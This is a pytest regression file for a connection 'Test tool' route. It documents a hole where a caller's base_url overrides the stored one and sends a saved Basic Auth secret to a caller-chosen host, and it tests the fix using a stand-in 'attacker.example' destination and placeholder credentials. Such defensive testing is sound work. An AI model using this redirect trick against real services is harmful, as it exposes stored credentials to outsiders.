"""POST /connections/test-tool must not send a saved secret to a caller-chosen host.

Upstream 0.0.524 added the per-tool "Test" button. Its handler merges the
caller's config OVER the stored one and then decrypts the saved credentials:

    config = {**(stored_config or {}), **config}   # caller wins
    if connection.credentials:
        credentials = connection.decrypt_credentials()

so a caller posting {connection_id, config: {base_url: "https://attacker"}}
gets the connection's saved Authorization header delivered to their own host,
with the response returned to them in `data_preview`. 0.0.524 also promoted
Basic Auth to a first-class custom_api credential, so the secret at risk is a
username and password.

Two separate holes, two separate tests below:

  * the destination must come from the stored config, never the caller;
  * `connection_id` arrives in the BODY, where @requires_resource_permission
    cannot see it, so the handler owes an explicit per-resource check — every
    other connection_id route in that file has one.
"""
import pytest

# Aliased on import: the route is named test_connection_tool, and pytest would
# otherwise collect the imported route object itself as a test case.
from app.routes.connection import (
    test_connection_tool as _test_tool_route,
    _is_destination_key,
)
from app.schemas.connection_schema import ConnectionToolTestRequest


STORED_HOST = "https://erp.internal.example"
ATTACKER_HOST = "https://attacker.example"


class _FakeConnection:
    """A saved custom_api connection holding a Basic Auth secret."""

    credentials = "gAAAAA-ciphertext"

    def __init__(self):
        self.config = {
            "base_url": STORED_HOST,
            "endpoints": [{"name": "list_customers", "method": "GET", "path": "/customers"}],
        }

    def decrypt_credentials(self):
        return {"auth_type": "basic", "username": "apiuser", "password": "apipass123"}


@pytest.fixture
def captured(monkeypatch):
    """Run the handler with the DB and the outbound call stubbed out.

    Returns the dict the handler finally hands to test_tool_params — i.e. the
    config the HTTP request would actually be built from.
    """
    import app.routes.connection as mod

    seen = {}

    async def _fake_get_connection(db, connection_id, organization):
        return _FakeConnection()

    async def _fake_test_tool_params(**kwargs):
        seen.update(kwargs)
        return {"success": True, "error": None, "content_type": "json",
                "data_preview": "{}", "truncated": False}

    async def _allow(**kwargs):
        seen["permission_checked"] = (
            kwargs.get("resource_type"),
            list(kwargs.get("resource_ids") or []),
            kwargs.get("permission"),
        )

    monkeypatch.setattr(mod.connection_service, "get_connection", _fake_get_connection)
    monkeypatch.setattr(mod.connection_service, "test_tool_params", _fake_test_tool_params)
    monkeypatch.setattr(mod, "check_resource_permissions", _allow, raising=False)
    return seen


def _request(config):
    return ConnectionToolTestRequest(
        type="custom_api",
        config=config,
        credentials={},          # empty => handler borrows the saved secret
        tool_name="list_customers",
        arguments={},
        connection_id="conn-1",
    )


async def _call(req):
    # The route is wrapped by @requires_permission, which resolves permissions
    # against a real DB. __wrapped__ is the handler itself.
    handler = getattr(_test_tool_route, "__wrapped__", _test_tool_route)
    return await handler(
        data=req,
        current_user=type("U", (), {"id": "user-1"})(),
        db=None,
        organization=type("O", (), {"id": "org-1"})(),
    )


@pytest.mark.asyncio
async def test_caller_cannot_redirect_a_borrowed_secret(captured):
    """The exfiltration itself: caller's base_url must lose to the stored one."""
    await _call(_request({"base_url": ATTACKER_HOST}))

    sent = captured["config"]
    assert sent["base_url"] == STORED_HOST, (
        f"saved Basic Auth credentials would be sent to {sent['base_url']!r}"
    )
    # And the secret really was attached — otherwise this test would pass on a
    # handler that simply never borrows credentials, proving nothing.
    assert captured["credentials"]["password"] == "apipass123"


@pytest.mark.asyncio
async def test_an_invented_destination_key_is_dropped(captured):
    """A destination key absent from the stored config cannot be introduced.

    Pinning only the keys present in stored_config would still let a caller add
    `server_url` to a connection whose saved config has no such key.
    """
    await _call(_request({"server_url": ATTACKER_HOST}))

    assert "server_url" not in captured["config"], (
        "caller introduced a destination key the saved connection never had"
    )


@pytest.mark.asyncio
async def test_non_destination_config_is_still_the_callers_to_edit(captured):
    """The feature must keep working: endpoint definitions come from the form.

    A fix that pinned the whole config would break the button this release
    added — the admin is editing endpoints and testing them against the saved
    connection.
    """
    await _call(_request({"endpoints": [{"name": "list_customers",
                                         "method": "GET", "path": "/v2/customers"}]}))

    assert captured["config"]["endpoints"][0]["path"] == "/v2/customers"
    assert captured["config"]["base_url"] == STORED_HOST


@pytest.mark.asyncio
async def test_body_supplied_connection_id_is_permission_checked(captured):
    """connection_id in the body still owes a per-resource check."""
    await _call(_request({}))

    assert captured.get("permission_checked") == (
        "connection", ["conn-1"], "manage_connection",
    ), "org-wide manage_connections alone reached a specific connection"


@pytest.mark.parametrize("key", ["base_url", "server_url", "endpoint_url", "URL", "host", "port"])
def test_destination_keys_are_recognised(key):
    assert _is_destination_key(key)


@pytest.mark.parametrize("key", ["endpoints", "headers", "csrf_token_flow", "transport"])
def test_non_destination_keys_are_not(key):
    assert not _is_destination_key(key)
